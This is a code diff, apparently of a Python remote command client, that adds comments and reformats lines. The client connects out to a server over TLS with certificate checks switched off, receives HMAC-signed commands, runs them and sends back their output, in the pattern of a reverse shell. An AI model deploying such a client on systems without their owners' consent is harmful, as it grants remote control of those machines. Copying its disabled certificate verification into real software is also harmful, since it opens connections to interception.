@@ -1,7 +1,6 @@
 import socket
 import subprocess
 import sys
-
 import ssl
 import base64
 import hmac
@@ -13,7 +12,6 @@ HMAC_KEY_PARAMETER = os.environ.get("HMAC", "")
 CLIENT_HOST = os.environ.get("CLIENT_HOST", "127.0.0.1")
 
 # Global Constants
-
 MAX_BYTES_REPONSE = 65536
 ENCODING = 'utf-8'
 STOP_WORD = "stop"
@@ -59,6 +57,7 @@ def create_session(client_host, server_host, port):
 
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+    # Make the connection TLS.
     client_socket = make_socket_tls(client_socket, server_host)
 
     try:
@@ -71,10 +70,9 @@ def create_session(client_host, server_host, port):
     # Creating and sending a registration request to the server (The request is the client's host).
     registration_request = client_host
 
-    if registration_request:
-        client_socket.send(bytes(registration_request, encoding=ENCODING))
-    else:
-        client_socket.send(bytes("None", encoding=ENCODING))
+    # if the registration request is valid send it, if not send back None.
+    if registration_request: client_socket.send(bytes(registration_request, encoding=ENCODING))
+    else: client_socket.send(bytes("None", encoding=ENCODING))
 
     return client_socket
 
@@ -98,6 +96,7 @@ def is_authorized_message(message, signature, hmac_key):
 
 def make_socket_tls(client_socket, server_host):
     # Wrap with SSL context
+
     context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
     context.check_hostname = False  # because it's self-signed
     context.verify_mode = ssl.CERT_NONE
@@ -123,20 +122,25 @@ def execute_message(socket_object, message):
 
 def get_response(socket_object, hmac_key):
     # Wait, and recieve the message from the server.
+
+    # Get the message and the signature
     message = socket_object.recv(MAX_BYTES_REPONSE).decode(ENCODING)
     signature = socket_object.recv(MAX_BYTES_REPONSE).decode(ENCODING)
     
-    if not is_authorized_message(message, signature, hmac_key):
-        return None
+    # check if the message is signed correctly.
+    if not is_authorized_message(message, signature, hmac_key): return None
+    
     return message
 
 
 def send_response(socket_object, result, hmac_key):
     # Sent the stdout and stderr of the command back to ther server.
     
+    # Send response.
     response = (result.stdout + result.stderr).strip() if result.stdout or result.stderr else " "
     socket_object.send(bytes(response, encoding=ENCODING))
 
+    # Send hmac signature.
     signature = hmac.new(hmac_key, response.encode(ENCODING), hashlib.sha256).hexdigest()
     socket_object.send(bytes(signature, encoding=ENCODING))
 
@@ -149,9 +153,11 @@ def stop_connection(socket_object):
 
 def main():
 
+    # Get the arguments.
     server_host, port = get_arguments()
     hmac_key = HMAC_KEY_PARAMETER if HMAC_KEY_PARAMETER != "" else get_hmac(HMAC_KEY_FILE_NAME)
 
+    # Create a new session.
     client_socket = create_session(CLIENT_HOST, server_host, port)
     client_socket.settimeout(CONNECTIONS_TIMEOUT)
     with client_socket:
@@ -159,9 +165,10 @@ def main():
             # Running until "stop" is sent from the server.
             while True:
                 try:
-
+                    # Waiting for response.
                     message = get_response(client_socket, hmac_key)
 
+                    # If the response is empty, send empty message back.
                     if not message:
                         send_response(client_socket, None, hmac_key)
                         continue
@@ -169,8 +176,10 @@ def main():
                     # If the message is stop, stop the session.
                     if message == STOP_WORD: break
                     
+                    # Execute the command.
                     result = execute_message(client_socket, message)
 
+                    # Send back the stdout and stderr.
                     send_response(client_socket, result, hmac_key)
                 except socket.timeout:
                     continue
@@ -178,6 +187,7 @@ def main():
         except KeyboardInterrupt:
             pass
     
+    # Disconnect from the server.
     stop_connection(client_socket)
 
 if __name__ == "__main__":
